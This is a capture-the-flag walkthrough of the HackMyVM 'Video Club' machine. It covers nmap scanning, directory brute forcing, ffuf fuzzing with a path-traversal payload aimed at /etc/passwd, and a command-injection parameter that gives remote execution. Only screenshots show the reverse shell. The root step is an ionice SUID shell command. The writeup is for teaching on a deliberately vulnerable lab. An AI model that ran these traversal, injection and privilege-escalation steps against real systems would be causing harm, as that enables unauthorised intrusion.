---
layout: default
title : muzec - Video Club Writeup
---

### Scanning With Nmap

We always start with an nmap scan.....

```Nmap -sC -sV -p- -oA nmap <Target-IP>```

```
# Nmap 7.91 scan initiated Sat Oct  2 16:07:21 2021 as: nmap -sC -sV -p- -oA nmap 172.16.139.237
Nmap scan report for 172.16.139.237
Host is up (0.00020s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 96:9f:0e:b8:03:40:88:96:8b:b1:bf:58:ac:ff:d5:3a (RSA)
|   256 f2:38:ff:38:44:1b:7a:5d:3d:0c:bb:cd:c3:93:55:45 (ECDSA)
|_  256 35:c2:e8:90:61:0d:19:7b:01:f0:b5:2a:d1:c6:27:ad (ED25519)
3377/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: MARGARITA VIDEO-CLUB
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct  2 16:07:35 2021 -- 1 IP address (1 host up) scanned in 14.37 seconds
```

We have HTTP port running on a different port seems cool i guess let start our enumeration already.

![image](https://user-images.githubusercontent.com/69868171/135774150-060a8147-b2a2-488c-878d-08b3b85ce82a.png)

A smooth video club web-page let check the source page for some hint.

![image](https://user-images.githubusercontent.com/69868171/135774172-2782252f-1ce0-41a2-ad1b-f5c97f71d351.png)

Not that userfull to us let burst some directory.

![image](https://user-images.githubusercontent.com/69868171/135774235-139351ec-8118-440c-bb02-44930cf8dac8.png)

With dirbuster got some directory just some normal ones like  `robots.txt` and `videos` let check the robots.txt first.

![image](https://user-images.githubusercontent.com/69868171/135774277-75eae686-80d1-418a-adbe-81929d56bf24.png)

We found a secret txt directory let confirm it.

![image](https://user-images.githubusercontent.com/69868171/135774335-4989a888-e15b-457c-ad47-f401bde00805.png)

Seems cool and Happy Birthday to HackMyVm Btw now back to our file seems like a usernames or passwords maybe a list to brute force directory am not to sure but going through the list found some words interesting.

![image](https://user-images.githubusercontent.com/69868171/135774417-7e91dc07-c5ed-4999-adef-83cc7e938360.png)

Putting it together `exiftool and steghide` seems crazy i know right lol so i decided to check all the metadata of all the images and videos on the website.

![image](https://user-images.githubusercontent.com/69868171/135774519-79a1f934-5d57-4b91-aab7-4c5b6baf320f.png)

![image](https://user-images.githubusercontent.com/69868171/135774542-13b843e4-b386-4ff7-8366-6e7efc4f9b8a.png)


With time i was able to put up a list now let brute force directory with the new lists created.

![image](https://user-images.githubusercontent.com/69868171/135775149-ec8c2c1a-f08b-4700-bc64-6729f7aa0376.png)

Interesting seems the php directory seems empty if you are thinking what am thinking let brute force for parameter.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HackMyVm/videoclub]
└─$ ffuf -c -ic -r -u 'http://172.16.139.237:3377/c0ntr0l.php?FUZZ=../../../../../../../../../../../../../../etc/passwd' -w list.txt -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://172.16.139.237:3377/c0ntr0l.php?FUZZ=../../../../../../../../../../../../../../etc/passwd
 :: Wordlist         : FUZZ: list.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 0
________________________________________________

:: Progress: [48/48] :: Job [1/1] :: 14 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/HackMyVm/videoclub]
```

`LFI` parameter brute forcing i got nothing now let try for `CMD` .

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HackMyVm/videoclub]
└─$ ffuf -c -ic -r -u 'http://172.16.139.237:3377/c0ntr0l.php?FUZZ=id' -w list.txt -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://172.16.139.237:3377/c0ntr0l.php?FUZZ=id
 :: Wordlist         : FUZZ: list.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 0
________________________________________________

f1ynn                   [Status: 200, Size: 54, Words: 3, Lines: 2]
:: Progress: [47/47] :: Job [1/1] :: 45 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

Boom we got the parameter and we have RCE.

![image](https://user-images.githubusercontent.com/69868171/135775294-ad8bba21-b70c-4459-9fbf-e7fe1f23cf4f.png)

Now let get shell back to our terminal.

![image](https://user-images.githubusercontent.com/69868171/135775330-d0e4823d-3db4-4ad1-beae-f45156e5637b.png)

I use python3 one liner reverse shell payload checking back to my listener and we have shell.

![image](https://user-images.githubusercontent.com/69868171/135775391-dcb06373-35c7-483e-b0fb-342dd0e5f119.png)

Spawn a tty shell and we are cool.

![image](https://user-images.githubusercontent.com/69868171/135775464-63fee035-b527-4ee4-997c-c8fa8f02d6d3.png)

Going to the home directory of user `librarian` we have the user.txt flag now time to get root.

### Privilege Escalation

```
find / -perm -u=s -type f 2>/dev/null
```

![image](https://user-images.githubusercontent.com/69868171/135775517-fdddafac-6ea9-46d4-8d66-7a7d11c0ed7d.png)

Enumerating for SUID and i found `/home/librarian/ionice` now let check gtfobins for exploit.

![image](https://user-images.githubusercontent.com/69868171/135775569-e7ce3260-59ac-458f-a26e-6d8646cd6753.png)

Command to get root  `/home/librarian/ionice /bin/sh -p`

![image](https://user-images.githubusercontent.com/69868171/135775607-e4523195-0a5c-469c-9094-47d54aa9b919.png)

Finding the root.txt flag `find / -name root.txt 2>/dev/null` .

![image](https://user-images.githubusercontent.com/69868171/135775689-6d258b9f-a546-437c-afb6-a8c92229e398.png)

And we are done box rooted.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
